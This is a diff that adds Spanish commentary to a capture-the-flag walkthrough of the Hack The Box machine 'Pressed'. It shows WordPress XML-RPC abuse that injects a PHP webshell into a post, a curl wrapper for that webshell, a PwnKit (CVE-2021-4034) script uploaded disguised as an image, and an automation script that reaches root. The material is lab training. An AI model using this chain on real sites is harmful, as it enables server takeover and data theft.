@@ -28,7 +28,11 @@ Nmap done: 1 IP address (1 host up) scanned in 36.88 seconds
 
 ## Website
 
+Nada de nada.
+
 ![image-center](/assets/images/Pasted image 20260102020419.png)
+
+Con el plugin de firefox wappalizer, vi que la pagina es corrida con `WordPress`, asi que use `wpscan` para buscar usuario, plugin, y demas cosas que sean vulnerables.
 
 ```bash
 wpscan --url http://pressed.htb
@@ -118,7 +122,9 @@ Interesting Finding(s):
 
 <SNIP>
 ```
+### Backup file
 
+El escaneo de revelo un archivo de `backup`, con credenciales para el usuario `admin`.
 
 ```php
  
@@ -140,10 +146,21 @@ define( 'DB_CHARSET', 'utf8mb4' );
 define( 'DB_COLLATE', '' );
 
 ```
+### 2FA Auth
+
+Probando las mismas, me indica que son invalidas.
 
 ![image-center](/assets/images/Pasted image 20260102021515.png)
 
+La password, termina en `2021` pero sabiendo que la maquina fue hecha en `2022` cambie el ultimo digito.
+
 ![image-center](/assets/images/Pasted image 20260102021607.png)
+### XLM-RPC Enumeration
+
+Al parecer esta protegida con `Autenticacion 2FA`, por lo que estoy encerrado, sin embargo volviendo al escaneo, vi que `XML-RPC` esta habilitado.
+Asi que use la siguiente guia de [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html?highlight=xml-rpc#xml-rpc) para enumerar credenciales.
+
+Viendo alguno de los metodos, uno me llamo la atencion.
 
 ```bash
  curl --data "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
@@ -160,6 +177,9 @@ define( 'DB_COLLATE', '' );
   <value><string>demo.addTwoNumbers</string></value>
   <value><string>demo.sayHello</string></value>
 ```
+### User flag
+
+Viendolo, veo la `user` flag de la maquina.
 
 ```bash
 curl --data "<methodCall><methodName>htb.get_flag</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
@@ -176,6 +196,11 @@ curl --data "<methodCall><methodName>htb.get_flag</methodName><params></params><
 </methodResponse>
 
 ```
+### Python wordpress XML-RPC
+
+Para la siguiete fase use la guia de este [link](https://python-wordpress-xmlrpc.readthedocs.io/en/latest/ref/methods.html#module-wordpress_xmlrpc.methods.media) para poder enumerar los metods, la cual usa `Python` para poder `interactuar a nivel de programacion` con el centro de medios de un sitio `WordPress` utilizando el protocolo XML-RPC.
+
+Use las credenciales, y la `url` del sistema.
 
 ```bash
 python2.7                          
@@ -195,6 +220,24 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>> plist[0].content
 '<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
 ```
+### Webshell
+
+Viendo uno de los métodos, veo un código en `Base64`, que decodificándolo vi lo siguiente:
+
+```php
+<?php  echo(file_get_contents('/var/www/html/output.log')); ?>
+```
+
+Al parecer es un pedazo de código `php` por lo que puedo usar el mismo para poder luego enviar mi payload a la `web`.
+
+Mi codigo quedo asi, lo codifique primero en formato `URL` y luego `base64`.
+
+```php
+<?php  echo(file_get_contents('/var/www/html/output.log')); system($_GET['cmd']); ?>
+```
+### Update method
+
+Luego usando la misma consola de `python`, actualice su contenido en la `web`.
 
 ```bash
 >>> post_mod = plist[0]
@@ -203,19 +246,29 @@ Type "help", "copyright", "credits" or "license" for more information.
 True
 ```
 
+De manera que colocando un `?cmd=whoami`, veo el output del comando.
+
 ![image-center](/assets/images/Pasted image 20260102024545.png)
 
+Para no tener que ir a la pagina constantemente a ejecutar el código me cree este script en `bash` para poder hacerlo de forma mas cómoda.
+
 ```bash
-┌──(root㉿kali)-[/home/zs1n/Desktop/htb/pressed]
-└─# ./webshell.sh 'id'    
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-                                                                                                                                                                                            
-┌──(root㉿kali)-[/home/zs1n/Desktop/htb/pressed]
-└─# cat webshell.sh 
 #!/bin/bash
 comand=$1
-curl -s -X GET "http://10.129.136.28/index.php/2022/01/28/hello-world/?cmd=$comand" | sed -n '/<\/table>/,/<\/p>/p' | sed 's/<[^>]*>//g' | awk 'NF'  
+curl -s -X GET "http://10.129.136.28/index.php/2022/01/28/hello-world/?cmd=$comand" | sed -n '/<\/table>/,/<\/p>/p' | sed 's/<[^>]*>//g' | awk 'NF'
 ```
+
+Y ejecutándolo veo que funciona.
+
+```bash
+./webshell.sh 'id'    
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+## Shell as root
+
+### PwnKit
+
+Veo que `pkexec` esta en la maquina, con el bit `SUID` asignado.
 
 ```bash
 ./webshell.sh 'find / -perm -4000 2>/dev/null | grep -v "var"'
@@ -233,8 +286,10 @@ curl -s -X GET "http://10.129.136.28/index.php/2022/01/28/hello-world/?cmd=$coma
 /usr/bin/pkexec
 ```
 
-https://github.com/kimusan/pkwner/blob/main/pkwner.sh
-https://python-wordpress-xmlrpc.readthedocs.io/en/latest/ref/methods.html#module-wordpress_xmlrpc.methods.media
+Por lo que recurrí a [este]([https://github.com/kimusan/pkwner/blob/main/pkwner.sh]()) `PoC` en `bash` para poder ejecutar comandos.
+### Upload file
+
+Una vez mas usando los métodos `media` de `WordPress` subí el archivo, con extensión de una imagen, ya que anteriormente me dio `error` con la extensión `.sh`.
 
 ```bash
 >>> from wordpress_xmlrpc.methods import media
@@ -244,6 +299,8 @@ https://python-wordpress-xmlrpc.readthedocs.io/en/latest/ref/methods.html#module
 >>> client.call(media.UploadFile(data))
 {'attachment_id': '48', 'description': '', 'parent': 0, 'title': 'pkexec.jpeg', 'url': '/wp-content/uploads/2026/01/pkexec.jpeg', 'date_created_gmt': <DateTime '20260102T10:16:57' at 7fc4040ead70>, 'id': '48', 'caption': '', 'link': '/wp-content/uploads/2026/01/pkexec.jpeg', 'file': 'pkexec.jpeg', 'type': 'text/plain', 'thumbnail': '/wp-content/uploads/2026/01/pkexec.jpeg', 'metadata': False}
 ```
+
+Teniendo el script mío ejecute con `bash` el script, lo cual me devolvió el output, indicando así que se ejecute de manera correcta.
 
 ```bash
 ./webshell.sh 'bash /var/www/html/wp-content/uploads/2026/01/pkexec.jpeg'
@@ -259,6 +316,11 @@ CVE-2021-4034 PoC by Kim Schulz
 [+] Build mini executor&#8230;
 hello[+] Nice Job
 ```
+### Script
+
+Para automatizar el proceso de subida, cree este script en `python` que me automatiza el proceso de subir la imagen a la web, y luego ejecutarlo.
+
+> Nota: dependiendo del comando que quieras que ejecute el `PwnKit.sh`, deberías de editarlo en el propio script que abusa de este binario.
 
 ```python
 import xmlrpc.client
@@ -320,6 +382,9 @@ if __name__ == "__main__":
     else:
         run_attack(sys.argv[1])
 ```
+### Root flag.
+
+Ejecutándolo, veo que contenido de la flag de `root` y además el output del comando `id`.
 
 ```bash
 python3 pwn.py pkexec.sh
